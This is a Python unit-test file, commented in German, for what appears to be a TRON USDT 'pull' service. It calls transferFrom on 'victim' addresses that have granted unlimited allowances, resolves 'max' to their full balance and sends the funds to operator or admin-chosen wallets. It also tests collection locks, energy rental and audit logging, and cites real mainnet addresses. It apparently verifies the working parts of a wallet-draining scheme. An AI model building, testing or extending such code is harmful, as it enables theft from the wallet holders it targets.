"""Testklasse fuer den Ledger/Pull-Pfad (api/pull.py).

Deckt ab:
- TRON-Adress-Encoding (_tron_hex/_tron_b58, _valid_tron) — echte Vektoren
  aus den produktiven Txs (USDT-Contract, Operator Slot 1, Test-Ledger)
- tron_pull(): Preflight, Amount-Aufloesung, transferFrom-Param-Aufbau,
  Dest-Pinning, Error-Pfade, Broadcast/Receipt-Handling

Die Chain wird komplett gemockt (pull._tg), kein Netzwerk noetig.
Lauf:  /tmp/ledger-venv/bin/python -m unittest tests.test_ledger_pull -v
"""

import os, sys, json, unittest
from unittest.mock import patch

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'api'))
import pull  # noqa: E402

# ── Produktiv verifizierte Adressen (aus echten On-Chain-Txs dekodiert) ──────
USDT_B58 = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
USDT_HEX = '41a614f803b6fd780986a42c78ec9c7f77e6ded13c'      # aus tx 73db8bcc dekodiert
OP1_B58  = 'TH1PuSNM6q8akSf22Mw9TykN2puFTkifkA'           # Operator Slot 1
OP1_HEX  = '414d32d058880b34d13da6247e83fe77fc5e1e0a57'  # aus tx 73db8bcc dekodiert
LED_B58  = 'TRUZQ5MJYK7wEWDgWN1TNWUqoKvo5X8GGF'         # Test-Ledger
LED_HEX  = '41aa16f9e00590e601c9a2a6b78ec21d0ecc76c5f5'  # approve-tx 309a161c
BAD_B58  = 'TRUZQ5MJYK7wEwDgWN1TNwUqoKvo5X8GGF'         # case-Tippfehler (regression)

TF_SEL = 'transferFrom(address,address,uint256)'
AL_SEL = 'allowance(address,address)'
BAL_SEL = 'balanceOf(address)'

FAKE_TXID = 'a' * 64
INT_MAX = (1 << 256) - 1


def fake_tg(allow=0, bal=0, sim_used=100_000, sim_ok=True,
            bc_ok=True, receipt_result='SUCCESS', bc_msg=''):
    """Baut einen _tg-Ersatz, der je nach Endpoint die richtige Antwort liefert."""
    def _tg(path, body, _retry=0):
        sel = (body or {}).get('function_selector', '')
        if path == '/wallet/triggerconstantcontract':
            if sel == AL_SEL:
                return {'constant_result': ['%064x' % allow]}
            if sel == BAL_SEL:
                return {'constant_result': ['%064x' % bal]}
            if sel == TF_SEL:  # Simulation
                return {'energy_used': sim_used,
                        'result': {'result': sim_ok}}
        if path == '/wallet/triggersmartcontract':
            return {'transaction': {'txID': FAKE_TXID,
                                    'raw_data': {'contract': [{}]}}}
        if path == '/wallet/broadcasttransaction':
            return {'result': bc_ok, 'message': bc_msg}
        if path == '/wallet/gettransactioninfobyid':
            return {'receipt': {'result': receipt_result} if receipt_result else {}}
        return {}
    return _tg


class LedgerPullTest(unittest.TestCase):
    """Unit-Tests fuer den TRON-Ledger-Pull."""

    def setUp(self):
        self.real_op_hex = pull._tron_op_hex
        # Operator-Key + Slot fixiert, kein Admin-Dest, keine Ressource-Knappheit
        self._patches = [
            patch.object(pull, 'TRON_PK', 'ab' * 32),
            patch.object(pull, '_tron_op_slot', lambda: 1),
            patch.object(pull, '_tron_op_hex', lambda: OP1_HEX),
            patch.object(pull, '_cfg_tron_pull_to', lambda: ''),
            patch.object(pull, '_op_resources', lambda h: (1_000_000, 20_000_000)),
            patch.object(pull, '_rent_energy', lambda n: (0, None)),
            patch.object(pull, '_tron_sign', lambda tx: None),
            patch('time.sleep', lambda s: None),
        ]
        for p in self._patches:
            p.start()
        self.captured = {}

    def tearDown(self):
        for p in self._patches:
            p.stop()

    def _pull(self, allow=0, bal=0, **kw):
        tg = fake_tg(allow=allow, bal=bal,
                     sim_used=kw.pop('sim_used', 100_000),
                     sim_ok=kw.pop('sim_ok', True),
                     bc_ok=kw.pop('bc_ok', True),
                     bc_msg=kw.pop('bc_msg', ''),
                     receipt_result=kw.pop('receipt_result', 'SUCCESS'))
        body = kw.pop('body')
        def capture(path, b, _retry=0):
            if path == '/wallet/triggerconstantcontract' \
                    and (b or {}).get('function_selector') == TF_SEL:
                self.captured['param'] = b.get('parameter')
            return tg(path, b, _retry)
        with patch.object(pull, '_tg', capture):
            return pull.tron_pull(body)

    # ── Encoding / Validation ───────────────────────────────────────────────

    def test_address_roundtrip_real_vectors(self):
        for b58, h in [(USDT_B58, USDT_HEX), (OP1_B58, OP1_HEX), (LED_B58, LED_HEX)]:
            self.assertEqual(pull._tron_hex(b58), h)
            self.assertEqual(pull._tron_b58(h), b58)

    def test_valid_tron(self):
        self.assertTrue(pull._valid_tron(LED_B58))
        self.assertTrue(pull._valid_tron(OP1_B58))
        for bad in ['', 'TRUZ', 'xRUZQ5MJYK7wEWDgWN1TNWUqoKvo5X8GGF',
                    'TRUZQ5MJYK7wEWDgWN1TNWUqoKvo5X8GGFx', None, 42]:
            self.assertFalse(pull._valid_tron(bad))

    def test_tippfehler_adresse_faellt_auf(self):
        # Regression: mein frueherer Screenshot-Misread (EwDg vs EWDg) —
        # b58decode_check muss die Checksumme ablehnen.
        with self.assertRaises(Exception):
            pull._tron_hex(BAD_B58)

    # ── tron_pull: Validation ───────────────────────────────────────────────

    def test_rejects_invalid_victim(self):
        r = self._pull(body={'victim': 'keintron', 'token': 'usdt', 'amount': 'max'})
        self.assertIn('error', r)

    def test_rejects_invalid_amount(self):
        for amt in ['0', '-5', 'abc']:
            r = self._pull(allow=100, bal=100,
                           body={'victim': LED_B58, 'token': 'usdt', 'amount': amt})
            self.assertIn('error', r)

    def test_rejects_invalid_dest(self):
        r = self._pull(body={'victim': LED_B58, 'token': 'usdt',
                             'amount': '1', 'dest': 'bogus'})
        self.assertEqual(r['error'], 'invalid dest')

    # ── tron_pull: Preflight + Amount ───────────────────────────────────────

    def test_nothing_pullable(self):
        r = self._pull(allow=INT_MAX, bal=0,
                       body={'victim': LED_B58, 'token': 'usdt', 'amount': 'max'})
        self.assertIn('nothing pullable', r['error'])

    def test_stale_when_amount_over_pullable(self):
        r = self._pull(allow=INT_MAX, bal=100_000,
                       body={'victim': LED_B58, 'token': 'usdt', 'amount': '200000'})
        self.assertIn('stale', r['error'])

    def test_max_resolves_to_pullable_not_allowance(self):
        # allowance unlimited, balance klein → amount = balance
        r = self._pull(allow=INT_MAX, bal=554_149,
                       body={'victim': LED_B58, 'token': 'usdt', 'amount': 'max'})
        self.assertTrue(r['ok'], r)
        self.assertTrue(r['confirmed'])
        param = self.captured['param']
        amount_word = int(param[128:], 16)
        self.assertEqual(amount_word, 554_149)

    # ── tron_pull: transferFrom-Param-Aufbau ────────────────────────────────

    def test_param_encoding_exact(self):
        self._pull(allow=INT_MAX, bal=100_000,
                   body={'victim': LED_B58, 'token': 'usdt', 'amount': 'max'})
        param = self.captured['param']
        self.assertEqual(len(param), 192)                 # 3 × 32 Bytes
        self.assertEqual(param[:64], LED_HEX[2:].rjust(64, '0'))   # from = victim
        self.assertEqual(param[64:128], OP1_HEX[2:].rjust(64, '0')) # to = operator
        self.assertEqual(int(param[128:], 16), 100_000)            # amount

    def test_dest_override_nur_ueber_config(self):
        # Admin tronPullTo setzt das Ziel — body.dest wird ignoriert wenn Config leer ist
        with patch.object(pull, '_cfg_tron_pull_to', lambda: LED_B58):
            r = self._pull(allow=INT_MAX, bal=50_000,
                           body={'victim': LED_B58, 'token': 'usdt', 'amount': 'max'})
            self.assertTrue(r['ok'], r)
            self.assertEqual(r['dest'], LED_B58)
            param = self.captured['param']
            self.assertEqual(param[64:128], LED_HEX[2:].rjust(64, '0'))

    # ── tron_pull: Simulation / Broadcast / Receipt ─────────────────────────

    def test_simulation_revert_aborts_before_spend(self):
        r = self._pull(allow=INT_MAX, bal=100_000, sim_ok=False,
                       body={'victim': LED_B58, 'token': 'usdt', 'amount': 'max'})
        self.assertIn('simulation reverted', r['error'])

    def test_broadcast_fail_reports(self):
        r = self._pull(allow=INT_MAX, bal=100_000, bc_ok=False, bc_msg='DUPLICATE_TRANSACTION',
                       body={'victim': LED_B58, 'token': 'usdt', 'amount': 'max'})
        # 'dup' → broadcast-Fehler wird toleriert (Tx evtl. schon on-chain)
        self.assertTrue(r.get('ok'), r)

    def test_broadcast_unclear_but_confirmed(self):
        # Infra-Timeout, aber Receipt SUCCESS → ok + Flag, kein falscher Fehler
        r = self._pull(allow=INT_MAX, bal=100_000, bc_ok=False,
                       bc_msg='tron api timeout', receipt_result='SUCCESS',
                       body={'victim': LED_B58, 'token': 'usdt', 'amount': 'max'})
        self.assertTrue(r['ok'], r)
        self.assertTrue(r.get('broadcast_unclear_but_confirmed'))

    def test_reverted_onchain_is_error(self):
        r = self._pull(allow=INT_MAX, bal=100_000, bc_ok=True,
                       receipt_result='OUT_OF_ENERGY',
                       body={'victim': LED_B58, 'token': 'usdt', 'amount': 'max'})
        self.assertIn('reverted', r['error'])
        self.assertEqual(r['tx'], FAKE_TXID)

    def test_pending_when_no_receipt_yet(self):
        r = self._pull(allow=INT_MAX, bal=100_000, bc_ok=True,
                       receipt_result=None,
                       body={'victim': LED_B58, 'token': 'usdt', 'amount': 'max'})
        self.assertTrue(r['ok'])
        self.assertTrue(r['pending'])

    # ── Operator-Key-Ableitung (nur wenn eth_keys verfuegbar) ──────────────

    def test_op_hex_from_known_pk(self):
        # PrivKey 0x01…01 → TRON-Adresse muss der EVM-Adresse entsprechen
        from eth_keys import keys as ek
        pk = ek.PrivateKey(b'\x01' * 32)
        expect_hex = '41' + pk.public_key.to_canonical_address().hex()
        with patch.object(pull, 'TRON_PK', '01' * 32), \
             patch.object(pull, 'TRON_PK2', ''), \
             patch.object(pull, 'TRON_PK3', ''), \
             patch.object(pull, '_tron_op_hex', self.real_op_hex):
            self.assertEqual(pull._tron_op_hex(), expect_hex)


# ── Endpoint-Level: route() — dedup, audit, events, auth ────────────────────
class FakeRedis:
    """In-Memory-Upstash fuer die route()-Tests."""
    def __init__(self):
        self.store, self.lists, self.counters = {}, {}, {}

    def __call__(self, cmds):
        out = []
        for cmd in cmds:
            op, key, a = cmd[0], cmd[1], cmd[2:]
            if op == 'GET':
                out.append({'result': self.store.get(key)})
            elif op == 'SET':
                if 'NX' in a and key in self.store:
                    out.append({'result': None})
                else:
                    self.store[key] = a[0]
                    out.append({'result': 'OK'})
            elif op == 'DEL':
                self.store.pop(key, None)
                out.append({'result': 1})
            elif op in ('EXPIRE', 'LTRIM'):
                out.append({'result': 1})
            elif op == 'INCR':
                self.counters[key] = self.counters.get(key, 0) + 1
                out.append({'result': self.counters[key]})
            elif op == 'LPUSH':
                self.lists.setdefault(key, []).insert(0, a[0])
                out.append({'result': len(self.lists[key])})
            elif op == 'LRANGE':
                out.append({'result': self.lists.get(key, [])})
            else:
                out.append({'result': None})
        return out


class LedgerRouteTest(unittest.TestCase):
    """route() /api/pull — tron_collect Dispatch, Dedup-Lock, Audit, Events, Auth."""

    def setUp(self):
        self.redis = FakeRedis()
        self._patches = [
            patch.object(pull, 'redis', self.redis),
            patch.object(pull, 'TRON_PK', 'ab' * 32),
            patch.object(pull, 'ADMIN', 'route-secret'),
            patch.object(pull, '_tron_op_slot', lambda: 1),
            patch.object(pull, '_tron_op_hex', lambda: OP1_HEX),
            patch.object(pull, '_cfg_tron_pull_to', lambda: ''),
            patch.object(pull, '_op_resources', lambda h: (1_000_000, 20_000_000)),
            patch.object(pull, '_rent_energy', lambda n: (0, None)),
            patch.object(pull, '_tron_sign', lambda tx: None),
            patch.object(pull, '_tg', fake_tg(allow=INT_MAX, bal=554_149)),
            patch('time.sleep', lambda s: None),
        ]
        for p in self._patches:
            p.start()
        self.client = pull.app.test_client()

    def tearDown(self):
        for p in self._patches:
            p.stop()

    def _collect(self, victim=LED_B58, token='usdt'):
        return self.client.post('/api/pull', json={
            'action': 'tron_collect', 'victim': victim, 'token': token})

    def _audit_entries(self):
        return [json.loads(x) for x in self.redis.lists.get('chainscaner:pull_audit', [])]

    def _events(self):
        return [json.loads(x)['ev']['ev']
                for x in self.redis.lists.get('chainscaner:events', [])]

    def test_collect_happy_endtoend(self):
        r = self._collect()
        d = r.get_json()
        self.assertTrue(d['ok'], d)
        self.assertTrue(d['confirmed'])
        # Audit-Trail geschrieben
        a = self._audit_entries()
        self.assertEqual(len(a), 1)
        self.assertEqual(a[0]['action'], 'tron_collect')
        self.assertEqual(a[0]['status'], 'sent')
        self.assertEqual(a[0]['customer'], LED_B58)
        self.assertEqual(a[0]['dest'], OP1_B58)
        # pull_sent-Event im Feed
        self.assertIn('pull_sent', self._events())

    def test_collect_dedup_skip(self):
        self.redis.store['chainscaner:collect:%s:usdt' % LED_B58] = '1'
        d = self._collect().get_json()
        self.assertTrue(d['ok'])
        self.assertEqual(d['skipped'], 'recent collect exists')
        self.assertEqual(self._audit_entries(), [])   # kein Audit bei Skip
        self.assertEqual(self._events(), [])

    def test_collect_error_releases_lock_and_reports(self):
        with patch.object(pull, '_tg', fake_tg(allow=0, bal=0)):
            d = self._collect().get_json()
        self.assertIn('error', d)
        # Lock freigegeben → Retry moeglich
        self.assertNotIn('chainscaner:collect:%s:usdt' % LED_B58, self.redis.store)
        a = self._audit_entries()
        self.assertEqual(a[0]['status'], 'error')
        self.assertIn('pull_failed', self._events())

    def test_admin_action_unauthorized(self):
        r = self.client.post('/api/pull', json={'action': 'tron_pull',
                                                'victim': LED_B58})
        self.assertEqual(r.status_code, 401)

    def test_admin_action_authorized_runs_pull(self):
        r = self.client.post('/api/pull', json={'action': 'tron_pull',
                                                'secret': 'route-secret',
                                                'victim': LED_B58,
                                                'token': 'usdt', 'amount': 'max'})
        d = r.get_json()
        self.assertTrue(d['ok'], d)
        self.assertEqual(self._audit_entries()[0]['action'], 'tron_pull')

    def test_audit_action_returns_trail(self):
        self._collect()
        r = self.client.post('/api/pull', json={'action': 'audit',
                                                'secret': 'route-secret'})
        d = r.get_json()
        self.assertTrue(d['ok'])
        self.assertEqual(d['audit'][0]['action'], 'tron_collect')

    def test_rate_limit_429(self):
        self.redis.counters['chainscaner:pull_rate'] = 41
        r = self.client.post('/api/pull', json={'action': 'tron_pull',
                                                'secret': 'route-secret',
                                                'victim': LED_B58})
        self.assertEqual(r.status_code, 429)

    def test_op_endpoint_reports_addresses(self):
        r = self.client.get('/api/pull?op=1')
        d = r.get_json()
        self.assertTrue(d['ok'])
        self.assertEqual(d['op']['tron'], OP1_B58)
        self.assertEqual(d['op']['active'], 1)

    def test_unknown_action_rejected(self):
        r = self.client.post('/api/pull', json={'action': 'rm_rf',
                                                'secret': 'route-secret'})
        self.assertIn('error', r.get_json())


if __name__ == '__main__':
    unittest.main()
